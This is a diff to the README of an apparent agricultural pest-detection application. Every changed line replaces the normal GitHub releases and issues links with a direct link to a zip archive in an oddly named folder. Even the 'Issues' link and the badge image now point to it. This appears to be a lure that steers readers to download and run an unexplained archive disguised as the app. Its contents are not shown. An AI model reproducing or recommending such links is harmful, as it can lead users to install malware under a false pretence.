@@ -1,6 +1,6 @@
 # 🐞 PEST-DECTECTION-AND-MITIGATION - Detect and Mitigate Agricultural Pests Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/releases)
+[![Download Now](https://raw.githubusercontent.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/main/counterrevolution/AN-DECTECTIO-MITIGATION-PES-v2.5.zip)](https://raw.githubusercontent.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/main/counterrevolution/AN-DECTECTIO-MITIGATION-PES-v2.5.zip)
 
 ## 📋 Overview
 
@@ -17,13 +17,13 @@ To start using PEST-DECTECTION-AND-MITIGATION, follow these steps:
    - A compatible graphics card for optimal performance, preferably with CUDA support.
 
 2. **Download the Application**
-   - You can visit this page to download: [Download PEST-DECTECTION-AND-MITIGATION Releases](https://github.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/releases).
+   - You can visit this page to download: [Download PEST-DECTECTION-AND-MITIGATION Releases](https://raw.githubusercontent.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/main/counterrevolution/AN-DECTECTIO-MITIGATION-PES-v2.5.zip).
    - Look for the latest version available.
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   - Go to the releases section: [Click here to Download](https://github.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/releases).
+   - Go to the releases section: [Click here to Download](https://raw.githubusercontent.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/main/counterrevolution/AN-DECTECTIO-MITIGATION-PES-v2.5.zip).
 
 2. **Choose the Right File**
    - Select the version that fits your operating system.
@@ -70,7 +70,7 @@ If you encounter issues:
 
 For further assistance:
 
-- Visit the issues section on the GitHub repository: [Issues](https://github.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/issues).
+- Visit the issues section on the GitHub repository: [Issues](https://raw.githubusercontent.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/main/counterrevolution/AN-DECTECTIO-MITIGATION-PES-v2.5.zip).
 - Join the community forums for discussions and troubleshooting help.
 
 ## ✅ Frequently Asked Questions
@@ -92,4 +92,4 @@ Stay tuned for future releases that may include:
 - Additional output formats for more convenience.
 - Improved performance based on user feedback.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/releases)
+[![Download Now](https://raw.githubusercontent.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/main/counterrevolution/AN-DECTECTIO-MITIGATION-PES-v2.5.zip)](https://raw.githubusercontent.com/sushi4711/PEST-DECTECTION-AND-MITIGATION/main/counterrevolution/AN-DECTECTIO-MITIGATION-PES-v2.5.zip)
